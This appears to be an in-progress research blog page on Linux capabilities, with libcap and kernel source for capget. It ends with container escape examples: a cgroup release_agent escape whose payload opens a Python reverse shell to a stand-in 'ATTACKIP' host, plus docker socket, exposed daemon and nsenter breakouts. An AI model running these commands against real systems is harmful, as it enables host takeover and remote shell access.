---
title: Linux and Containers Internals [eng] [in process]
published: true
tags: [ "linux", "containers", "research" ]
image: /assets/previews/30.jpg
layout: page
pagination: 
  enabled: true
---

# [](#header-1)Capabilities

It's actually an additional way to secure (in addition to default RWX) processes. We have main tools in userspace to interact with them:
setcap</br>
getcap</br>
capsh --print</br>
getpcaps $$</br>
(and others from [libcap2](https://packages.debian.org/sid/libcap2) package)</br>
From the official debian description:
>Libcap implements the user-space interfaces to the POSIX 1003.1e capabilities available in Linux kernels. These capabilities are a partitioning of the all powerful root privilege into a set of distinct privileges.

From [linux man page](https://man7.org/linux/man-pages/man7/capabilities.7.html) we have all available capabilities, lit's dive into the source code of one of them</br>
One of them, which everyone knows - 
```
CAP_NET_BIND_SERVICE
  Bind a socket to Internet domain privileged ports (port numbers less than 1024).
```
For a lower level of abstaction we'll use our programs</br>

In default state typical user without additional permissions can't run services on ports less than 1024:

program.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

int main() {
    int sockfd;
    struct sockaddr_in server_addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Error");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(80);

    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Error");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Done!\n");

    close(sockfd);
    return 0;
}
```

```bash
test@local:~$ gcc program.c -o program

test@local:~$ getcap program
<nothing>

test@local:~$ ./program
Error: Permission denied

root@local:~$ setcap 'cap_net_bind_service=+ep' program

test@local:~$ ./program
Done!
```

Default one for ex</br>
```bash
root@local:~$ getcap /bin/ping
/bin/ping cap_net_raw=ep
```

In the source code of libcap2(userspace api) we can find the following:

3 variants of capabilities:</br>
```go
# /cap/cap.go
func (f Flag) String() string {
	switch f {
	case Effective:
		return "e"
	case Permitted:
		return "p"
	case Inheritable:
		return "i"
	default:
		return "<Error>"
	}
}
```

**Effective** - currently activated for process</br>
**Permitted** - may be potentially activated and moved to Effective</br>
**Inheritable** - rights, which may be inherited by a child process, if it explicitly requests it

The full list can be found for ex in</br>
```go
/cap/names.go
var names = map[Value]string{
	CHOWN:              "cap_chown",
	DAC_OVERRIDE:       "cap_dac_override",
	DAC_READ_SEARCH:    "cap_dac_read_search",
	FOWNER:             "cap_fowner",
	FSETID:             "cap_fsetid",
	KILL:               "cap_kill",
	SETGID:             "cap_setgid",
...
```

In kernel we can find such thing:</br>
```c
/kernel/capability.c
/**
 * sys_capget - get the capabilities of a given process.
 * @header: pointer to struct that contains capability version and
 *	target pid data
 * @dataptr: pointer to struct that contains the effective, permitted,
 *	and inheritable capabilities that are returned
 *
 * Returns 0 on success and < 0 on error.
 */
SYSCALL_DEFINE2(capget, cap_user_header_t, header, cap_user_data_t, dataptr)
{
	int ret = 0;
	pid_t pid;
	unsigned tocopy;
	kernel_cap_t pE, pI, pP;
	struct __user_cap_data_struct kdata[2];

	ret = cap_validate_magic(header, &tocopy);
	if ((dataptr == NULL) || (ret != 0))
		return ((dataptr == NULL) && (ret == -EINVAL)) ? 0 : ret;

	if (get_user(pid, &header->pid))
		return -EFAULT;

	if (pid < 0)
		return -EINVAL;

	ret = cap_get_target_pid(pid, &pE, &pI, &pP);
	if (ret)
		return ret;

	/*
	 * Annoying legacy format with 64-bit capabilities exposed
	 * as two sets of 32-bit fields, so we need to split the
	 * capability values up.
	 */
	kdata[0].effective   = pE.val; kdata[1].effective   = pE.val >> 32;
	kdata[0].permitted   = pP.val; kdata[1].permitted   = pP.val >> 32;
	kdata[0].inheritable = pI.val; kdata[1].inheritable = pI.val >> 32;

	/*
	 * Note, in the case, tocopy < _KERNEL_CAPABILITY_U32S,
	 * we silently drop the upper capabilities here. This
	 * has the effect of making older libcap
	 * implementations implicitly drop upper capability
	 * bits when they perform a: capget/modify/capset
	 * sequence.
	 *
	 * This behavior is considered fail-safe
	 * behavior. Upgrading the application to a newer
	 * version of libcap will enable access to the newer
	 * capabilities.
	 *
	 * An alternative would be to return an error here
	 * (-ERANGE), but that causes legacy applications to
	 * unexpectedly fail; the capget/modify/capset aborts
	 * before modification is attempted and the application
	 * fails.
	 */
	if (copy_to_user(dataptr, kdata, tocopy * sizeof(kdata[0])))
		return -EFAULT;

	return 0;
}
```

```c
/kernel/capability.c
/*
 * The only thing that can change the capabilities of the current
 * process is the current process. As such, we can't be in this code
 * at the same time as we are in the process of setting capabilities
 * in this process. The net result is that we can limit our use of
 * locks to when we are reading the caps of another process.
 */
static inline int cap_get_target_pid(pid_t pid, kernel_cap_t *pEp,
				     kernel_cap_t *pIp, kernel_cap_t *pPp)
{
	int ret;

	if (pid && (pid != task_pid_vnr(current))) {
		const struct task_struct *target;

		rcu_read_lock();

		target = find_task_by_vpid(pid);
		if (!target)
			ret = -ESRCH;
		else
			ret = security_capget(target, pEp, pIp, pPp);

		rcu_read_unlock();
	} else
		ret = security_capget(current, pEp, pIp, pPp);

	return ret;
}
```

```c
/security/security.c
/**
 * security_capget() - Get the capability sets for a process
 * @target: target process
 * @effective: effective capability set
 * @inheritable: inheritable capability set
 * @permitted: permitted capability set
 *
 * Get the @effective, @inheritable, and @permitted capability sets for the
 * @target process.  The hook may also perform permission checking to determine
 * if the current process is allowed to see the capability sets of the @target
 * process.
 *
 * Return: Returns 0 if the capability sets were successfully obtained.
 */
int security_capget(const struct task_struct *target,
		    kernel_cap_t *effective,
		    kernel_cap_t *inheritable,
		    kernel_cap_t *permitted)
{
	return call_int_hook(capget, target, effective, inheritable, permitted);
}
```

```c
/include/linux/lsm_hook_defs.h
LSM_HOOK(int, 0, capget, const struct task_struct *target, kernel_cap_t *effective, kernel_cap_t *inheritable, kernel_cap_t *permitted)
```

```c
/security/security.c
#define call_int_hook(FUNC, ...) ({
	int RC = LSM_RET_DEFAULT(FUNC);
	do {
		struct security_hook_list *P;

		hlist_for_each_entry(P, &security_hook_heads.FUNC, list) {
			RC = P->hook.FUNC(__VA_ARGS__);
			if (RC != LSM_RET_DEFAULT(FUNC))
				break;
		}
	} while (0);
	RC;
})
```

```c
/security/commoncap.c
static struct security_hook_list capability_hooks[] __ro_after_init = {
	LSM_HOOK_INIT(capable, cap_capable),
	LSM_HOOK_INIT(settime, cap_settime),
	LSM_HOOK_INIT(ptrace_access_check, cap_ptrace_access_check),
	LSM_HOOK_INIT(ptrace_traceme, cap_ptrace_traceme),
	LSM_HOOK_INIT(capget, cap_capget),
	LSM_HOOK_INIT(capset, cap_capset),
	LSM_HOOK_INIT(bprm_creds_from_file, cap_bprm_creds_from_file),
	LSM_HOOK_INIT(inode_need_killpriv, cap_inode_need_killpriv),
	LSM_HOOK_INIT(inode_killpriv, cap_inode_killpriv),
	LSM_HOOK_INIT(inode_getsecurity, cap_inode_getsecurity),
	LSM_HOOK_INIT(mmap_addr, cap_mmap_addr),
	LSM_HOOK_INIT(mmap_file, cap_mmap_file),
	LSM_HOOK_INIT(task_fix_setuid, cap_task_fix_setuid),
	LSM_HOOK_INIT(task_prctl, cap_task_prctl),
	LSM_HOOK_INIT(task_setscheduler, cap_task_setscheduler),
	LSM_HOOK_INIT(task_setioprio, cap_task_setioprio),
	LSM_HOOK_INIT(task_setnice, cap_task_setnice),
	LSM_HOOK_INIT(vm_enough_memory, cap_vm_enough_memory),
};
```

```c
/include/linux/lsm_hooks.h
#define LSM_HOOK_INIT(HEAD, HOOK) { .head = &security_hook_heads.HEAD, .hook = { .HEAD = HOOK } }
```

```c
/security/commoncap.c
/**
 * cap_capget - Retrieve a task's capability sets
 * @target: The task from which to retrieve the capability sets
 * @effective: The place to record the effective set
 * @inheritable: The place to record the inheritable set
 * @permitted: The place to record the permitted set
 *
 * This function retrieves the capabilities of the nominated task and returns
 * them to the caller.
 */
int cap_capget(const struct task_struct *target, kernel_cap_t *effective,
	       kernel_cap_t *inheritable, kernel_cap_t *permitted)
{
	const struct cred *cred;

	/* Derived from kernel/capability.c:sys_capget. */
	rcu_read_lock();
	cred = __task_cred(target);
	*effective   = cred->cap_effective;
	*inheritable = cred->cap_inheritable;
	*permitted   = cred->cap_permitted;
	rcu_read_unlock();
	return 0;
}
```

```c
/include/linux/cred.h
struct cred {
	atomic_long_t	usage;
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key	*session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct ucounts *ucounts;
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	/* RCU deletion */
	union {
		int non_rcu;			/* Can we skip RCU deletion? */
		struct rcu_head	rcu;		/* RCU deletion hook */
	};
} __randomize_layout;
```


## [](#header-2)Container escape abuse examples

### [](#header-3) If privileged mode, then maybe:
[code](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)

```bash
> capsh --print 
Current: = cap_chown, cap_sys_module, cap_sys_chroot, cap_sys_admin, cap_setgid,cap_setuid
cap_sys_admin - allows mounting fs

> mkdir /tmp/expl
> mount -t cgroup -o rdma cgroup /tmp/expl
> mkdir /tmp/expl/x

> echo 1 > /tmp/expl/x/notify_on_release

> host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

> echo "$host_path/exploit" > /tmp/expl/release_agent

> cat > /exploit << EOF
#!/bin/bash
export RHOST="ATTACKIP";export RPORT=31337;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
EOF

> chmod a+x /exploit

> sh -c "echo \$\$ > /tmp/expl/x/cgroup.procs"
```

### [](#header-3) If docker socket is exposed:

```bash
docker run -it --rm -v /:/host alpine chroot /host sh
```
Even if we are already in the container, socket is host based, so if we the mount host folder, it will also be the first level filesystem(it's on the host, no matter how many times deep we're in the container)

### [](#header-3) If docker daemon is exposed(portainer/jenkins for remote administration):

port 2375</br>
```bash
docker -H tcp://REMOTEIP:2375 ps
docker -H tcp://REMOTEIP:2375 run -it --rm -v /:/host alpine chroot /host sh
```

### [](#header-3) Namespaces abuse:

```bash
nsenter --target 1 --mount --uts --ipc --net /bin/bash
```
We switch namespaces to PID 1 process


## [](#header-2)Links / Resources
[Linux Capabilities: making them work](https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/33528.pdf)</br>
[Bug case in sendmail](https://seclists.org/bugtraq/2000/Jun/98)</br>
[capabilities walkthough](https://blog.senyuuri.info/posts/2021-02-06-linux-capability-a-kernel-workthrough/)</br>



# [](#header-1)All Links / Resources
[Papers extracted from the proceedings of the Ottawa Linux Symposium](https://www.kernel.org/doc/ols/)</br>
